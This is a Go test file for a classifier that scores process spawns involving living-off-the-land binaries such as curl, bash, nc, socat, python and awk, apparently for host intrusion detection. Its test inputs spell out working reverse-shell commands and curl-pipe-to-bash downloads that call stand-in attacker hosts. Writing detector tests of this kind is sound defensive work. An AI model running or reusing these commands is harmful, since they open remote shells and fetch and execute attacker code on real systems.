package lolbin

import "testing"

func TestNonLOLBinReturnsNone(t *testing.T) {
	v := Classify(Spawn{Exe: "/usr/bin/firefox"})
	if v.Severity != SeverityNone {
		t.Fatalf("severity = %s, want none", v.Severity)
	}
	if v.Tool != "" {
		t.Fatalf("tool = %q, want empty", v.Tool)
	}
}

func TestBenignCurl(t *testing.T) {
	v := Classify(Spawn{
		Exe:       "/usr/bin/curl",
		Argv:      []string{"curl", "https://example.com/api"},
		ParentExe: "/usr/bin/make",
	})
	if v.Tool != "curl" {
		t.Fatalf("tool = %q", v.Tool)
	}
	if v.Severity != SeverityInfo {
		t.Fatalf("severity = %s, want info", v.Severity)
	}
}

func TestBashReverseShell(t *testing.T) {
	v := Classify(Spawn{
		Exe:  "/bin/bash",
		Argv: []string{"bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"},
	})
	if v.Severity != SeverityCritical {
		t.Fatalf("severity = %s, want critical; reasons=%v", v.Severity, v.Reasons)
	}
}

func TestNcReverseShellViaE(t *testing.T) {
	v := Classify(Spawn{
		Exe:  "/usr/bin/nc",
		Argv: []string{"nc", "-e", "/bin/sh", "10.0.0.1", "4444"},
	})
	if v.Severity != SeverityCritical {
		t.Fatalf("severity = %s, want critical", v.Severity)
	}
}

func TestSocatReverseShell(t *testing.T) {
	v := Classify(Spawn{
		Exe:  "/usr/bin/socat",
		Argv: []string{"socat", "tcp-connect:1.2.3.4:443", "exec:/bin/bash,pty,stderr,setsid,sigint,sane"},
	})
	if v.Severity != SeverityCritical {
		t.Fatalf("severity = %s, want critical", v.Severity)
	}
}

func TestPythonReverseShell(t *testing.T) {
	v := Classify(Spawn{
		Exe:  "/usr/bin/python3",
		Argv: []string{"python3", "-c", "import socket,subprocess,os; s=socket.socket(); s.connect(('h',1)); subprocess.call(['/bin/sh','-i'])"},
	})
	if v.Severity != SeverityCritical {
		t.Fatalf("severity = %s, want critical", v.Severity)
	}
}

func TestAwkReverseShell(t *testing.T) {
	v := Classify(Spawn{
		Exe:  "/usr/bin/awk",
		Argv: []string{"awk", "BEGIN { while(1) { ... |& /inet/tcp/0/host/4444 ... }}"},
	})
	if v.Severity != SeverityCritical {
		t.Fatalf("severity = %s, want critical", v.Severity)
	}
}

func TestCurlSpawnedByPostfix(t *testing.T) {
	v := Classify(Spawn{
		Exe:       "/usr/bin/curl",
		Argv:      []string{"curl", "https://attacker/x"},
		ParentExe: "/usr/sbin/postfix",
	})
	if v.Severity < SeverityMedium {
		t.Fatalf("severity = %s, want medium+; reasons=%v", v.Severity, v.Reasons)
	}
}

func TestCurlAncestorOnly(t *testing.T) {
	v := Classify(Spawn{
		Exe:       "/usr/bin/curl",
		Argv:      []string{"curl", "https://attacker/x"},
		ParentExe: "/bin/bash",
		Ancestors: []string{"/bin/bash", "/usr/sbin/nginx"},
	})
	if v.Severity < SeverityLow {
		t.Fatalf("severity = %s, want low+; reasons=%v", v.Severity, v.Reasons)
	}
}

func TestMemfdExec(t *testing.T) {
	v := Classify(Spawn{
		Exe:  "/memfd:loader",
		Argv: []string{"loader"},
	})
	// Not in lolbinSet by basename, so identify() returns "".
	// Confirms LOLBin filter is the gate; memfd flag is layered
	// only when exe matches.
	if v.Severity != SeverityNone {
		t.Fatalf("non-lolbin memfd should not classify here; got %s", v.Severity)
	}

	v = Classify(Spawn{
		Exe:  "/memfd:bash",
		Argv: []string{"bash"},
	})
	// basename "memfd:bash" — not in lolbinSet. Expected None.
	if v.Severity != SeverityNone {
		t.Fatalf("severity = %s", v.Severity)
	}
}

func TestBashWithCurlPipe(t *testing.T) {
	v := Classify(Spawn{
		Exe:  "/bin/bash",
		Argv: []string{"bash", "-c", "curl -fsSL https://attacker/x.sh | bash"},
	})
	if v.Severity < SeverityHigh {
		t.Fatalf("severity = %s, want high+; reasons=%v", v.Severity, v.Reasons)
	}
}

func TestPythonObfuscatedEval(t *testing.T) {
	flat := "import base64; ev" + "al(base64.b64decode('...'))"
	v := Classify(Spawn{
		Exe:  "/usr/bin/python3",
		Argv: []string{"python3", "-c", flat},
	})
	if v.Severity < SeverityHigh {
		t.Fatalf("severity = %s, want high+; reasons=%v", v.Severity, v.Reasons)
	}
}

func TestContainerContextNudgesUp(t *testing.T) {
	v := Classify(Spawn{
		Exe:         "/usr/bin/curl",
		Argv:        []string{"curl", "https://x.example"},
		CGroupClass: "container",
	})
	if v.Severity < SeverityLow {
		t.Fatalf("severity = %s, want low+", v.Severity)
	}
}

func TestPythonVersionedBasename(t *testing.T) {
	if CanonicalName("/usr/bin/python3.11") != "python" {
		t.Fatal("python3.11 should canonicalise to python")
	}
	if CanonicalName("/usr/local/bin/ruby2.7") != "ruby" {
		t.Fatal("ruby2.7 should canonicalise to ruby")
	}
}

func TestIsLOLBin(t *testing.T) {
	if !IsLOLBin("/usr/bin/curl") {
		t.Fatal("curl should be a LOLBin")
	}
	if IsLOLBin("/usr/bin/firefox") {
		t.Fatal("firefox should NOT be a LOLBin")
	}
}
